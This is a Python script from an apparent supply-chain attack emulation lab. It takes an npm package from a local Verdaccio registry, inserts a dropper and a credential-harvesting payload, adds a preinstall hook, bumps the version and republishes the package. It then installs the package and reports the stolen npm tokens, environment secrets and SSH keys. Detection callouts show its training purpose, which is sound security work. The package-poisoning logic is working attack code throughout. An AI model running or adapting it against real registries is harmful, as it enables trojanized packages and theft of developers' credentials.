"""
phase_1_payload_delivery.py -- Phase 1: Malicious Package Injection
MITRE ATT&CK: T1195.002, T1036.004, T1546
"""
import json
import os
import shutil
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Any, Dict

import requests

from utils import (
    log_event, mark_step_complete, print_detection, print_error, print_info,
    print_link, print_value, print_phase_banner, print_step, print_success,
    print_warning,
)

PHASE_NUM = 1
PHASE_NAME = "Payload Delivery"
PHASE_DESCRIPTION = "npm injection + Bun dropper"
VERDACCIO_URL = "http://localhost:4873"


def step_inject_package(config) -> Dict[str, Any]:
    """Step 1.1: Download auth-helpers, inject payload, bump version, republish."""
    print_step("1.1", "Inject payload into @novatech/auth-helpers")
    config.require_verdaccio()

    payloads_dir = Path(__file__).resolve().parent / "payloads"
    setup_bun = payloads_dir / "setup_bun.js"
    bun_env = payloads_dir / "bun_environment.js"
    if not setup_bun.exists() or not bun_env.exists():
        print_error(f"Payload files not found in {payloads_dir}"); return {}

    work_dir = tempfile.mkdtemp(prefix="sh2-inject-")
    try:
        # Download current version
        r = subprocess.run(["npm", "pack", "@novatech/auth-helpers", "--registry", VERDACCIO_URL],
            capture_output=True, text=True, cwd=work_dir, timeout=30)
        if r.returncode != 0:
            print_error(f"npm pack failed: {r.stderr}"); return {}

        tarballs = list(Path(work_dir).glob("*.tgz"))
        if not tarballs:
            print_error("No tarball found"); return {}
        print_success(f"Downloaded: {tarballs[0].name}")

        # Extract and inject
        subprocess.run(["tar", "xzf", str(tarballs[0])], cwd=work_dir, timeout=15)
        pkg_dir = Path(work_dir) / "package"
        if not pkg_dir.exists():
            print_error("Extracted package directory not found"); return {}

        shutil.copy2(str(setup_bun), str(pkg_dir / "setup_bun.js"))
        shutil.copy2(str(bun_env), str(pkg_dir / "bun_environment.js"))

        # Modify package.json
        pkg_json_path = pkg_dir / "package.json"
        with open(pkg_json_path) as f:
            pkg = json.load(f)
        old_ver = pkg["version"]
        pkg.setdefault("scripts", {})
        pkg["scripts"]["preinstall"] = "node setup_bun.js"
        parts = pkg["version"].split(".")
        parts[2] = str(int(parts[2]) + 1)
        new_ver = ".".join(parts)
        pkg["version"] = new_ver
        with open(pkg_json_path, "w") as f:
            json.dump(pkg, f, indent=2)

        print_success(f"Injected preinstall hook into package")
        print_value("Original version", old_ver)
        print_value("Infected version", new_ver)
        print_value("Preinstall hook", '"node setup_bun.js"')
        print_value("Injected files", "setup_bun.js (dropper) + bun_environment.js (harvester)")

        # Publish
        r = subprocess.run(["npm", "publish", "--registry", VERDACCIO_URL],
            capture_output=True, text=True, cwd=str(pkg_dir), timeout=30)
        if r.returncode != 0:
            if "cannot publish over" in r.stderr.lower():
                print_warning(f"Version {new_ver} already published (previous run)")
                mark_step_complete("1.1")
                return {"package": "@novatech/auth-helpers", "version": new_ver, "reused": True}
            print_error(f"npm publish failed: {r.stderr}"); return {}

        print_success(f"Published @novatech/auth-helpers@{new_ver} to Verdaccio")
        print_link("Verify on registry", f"{VERDACCIO_URL}/-/web/detail/@novatech/auth-helpers")
        print_info("Anyone running 'npm install @novatech/auth-helpers@^2.4.0' will now get the infected version")
        print_detection("SCA", f"Package @novatech/auth-helpers updated {old_ver} -> {new_ver} with new preinstall script")
        print_detection("ASPM", "Package published from unusual IP (not CI/CD)")
        mark_step_complete("1.1")
        return {"package": "@novatech/auth-helpers", "version": new_ver}
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)


def step_trigger_payload(config) -> Dict[str, Any]:
    """Step 1.2: Install the infected package to trigger the preinstall hook."""
    print_step("1.2", "Trigger infected package (npm install)")

    # Check if Bun existed BEFORE this step (to distinguish new install vs pre-existing)
    bun_path = os.path.expanduser("~/.bun/bin/bun")
    bun_existed_before = os.path.exists(bun_path)

    work_dir = tempfile.mkdtemp(prefix="sh2-victim-")
    try:
        with open(os.path.join(work_dir, "package.json"), "w") as f:
            json.dump({"name": "novatech-api-service", "version": "1.0.0",
                       "dependencies": {"@novatech/auth-helpers": "^2.4.0"}}, f, indent=2)

        exfil_dir = os.path.expanduser("~/.shai-hulud-exfil")
        env = os.environ.copy()
        env["WORM_EXFIL_DIR"] = exfil_dir

        print_info("Running 'npm install' on a project that depends on the infected package...")
        print_info("The preinstall hook will fire BEFORE the package finishes installing")
        r = subprocess.run(["npm", "install", "--registry", VERDACCIO_URL],
            capture_output=True, text=True, cwd=work_dir, timeout=120, env=env)

        # The payload runs as a DETACHED background process -- wait for it to finish
        print_info("Waiting 10 seconds for the detached background payload to complete...")
        time.sleep(10)

        # Check results
        bun_installed_now = os.path.exists(bun_path)
        bun_newly_installed = bun_installed_now and not bun_existed_before

        if bun_newly_installed:
            bun_ver = subprocess.run([bun_path, "--version"], capture_output=True, text=True, timeout=5)
            print_success(f"Bun runtime installed by the dropper (version: {bun_ver.stdout.strip()})")
            print_value("Bun path", bun_path)
            print_info("Security tools monitoring for 'node' processes would miss this 'bun' process")
            print_detection("CWP", "npm install spawned unexpected child process (bun)")
        elif bun_installed_now:
            print_info("Bun was already installed from a previous run")
        else:
            print_info("Bun installation was skipped (Node.js fallback used)")

        if os.path.exists(exfil_dir):
            files = os.listdir(exfil_dir)
            print_success(f"Payload executed! Harvested credentials written to disk")
            print_value("Exfil directory", exfil_dir)
            print_value("Files created", ", ".join(files))

            # Show what was found
            local_creds = os.path.join(exfil_dir, "local_credentials.json")
            if os.path.exists(local_creds):
                try:
                    with open(local_creds) as f:
                        creds = json.load(f)
                    npm_count = len(creds.get("npm_tokens", []))
                    env_count = len(creds.get("env_secrets", {}))
                    ssh_count = len(creds.get("ssh_keys", []))
                    git_count = len(creds.get("git_repos", []))
                    print_success(f"Credentials harvested from local filesystem:")
                    print_value("npm tokens", str(npm_count))
                    print_value("Environment secrets", str(env_count))
                    print_value("SSH private keys", str(ssh_count))
                    print_value("Git repos (for TruffleHog)", str(git_count))
                    for t in creds.get("npm_tokens", []):
                        print_value("  npm token", t[:30] + "..." if len(t) > 30 else t)
                    for k, v in list(creds.get("env_secrets", {}).items())[:3]:
                        print_value(f"  {k}", v[:30] + "..." if len(str(v)) > 30 else str(v))
                except Exception:
                    pass
            print_link("Inspect exfil data", f"cat {exfil_dir}/local_credentials.json | python3 -m json.tool")
        else:
            print_warning("Exfil directory not found -- the detached payload may have failed")
            print_info("This can happen if the Bun process crashed or if WORM_EXFIL_DIR was not inherited")
            print_info("Try running the payload manually: cd ~/.shai-hulud-exfil && node ~/path/to/bun_environment.js")

        print_detection("CWP", "Process accessing .npmrc, .env, .ssh/ credential paths in rapid succession")
        mark_step_complete("1.2")
        return {"exfil_dir": exfil_dir, "bun_installed": bun_installed_now, "bun_new": bun_newly_installed}
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)


STEPS = [
    ("1.1", "Inject payload into @novatech/auth-helpers", step_inject_package),
    ("1.2", "Trigger infected package locally", step_trigger_payload),
]

def run_phase(config) -> Dict[str, Any]:
    print_phase_banner(1, "PAYLOAD DELIVERY -- npm Injection + Bun Dropper")
    results = {}
    for step_id, _, step_func in STEPS:
        try:
            results[step_id] = step_func(config)
            if not results[step_id]:
                print_warning(f"Step {step_id} returned empty, stopping phase"); break
        except RuntimeError as exc:
            print_error(str(exc)); break
    return results
